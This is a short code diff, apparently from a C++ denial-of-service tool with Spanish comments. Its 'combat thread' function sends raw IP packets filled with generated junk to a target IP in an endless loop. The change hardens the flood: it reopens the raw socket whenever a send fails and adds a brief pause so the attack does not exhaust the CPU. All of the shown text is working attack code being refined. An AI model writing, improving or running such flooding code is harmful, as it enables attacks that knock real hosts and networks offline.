@@ -60,8 +60,14 @@ void hilo_combate(std::string target_ip) {
     while (true) {
         generar_materia_oscura(data, PAYLOAD_SIZE);
         if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-            usleep(100); // Pequeña pausa si el buffer está lleno
+            // Si el socket falla, lo cerramos y lo re-abrimos para limpiar FDs
+            close(sock);
+            sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+            usleep(100); 
         }
+        
+        // [AUDITORIA] Micro-pausa para evitar colapso de CPU (100% de núcleos)
+        usleep(10); 
     }
 
     close(sock);
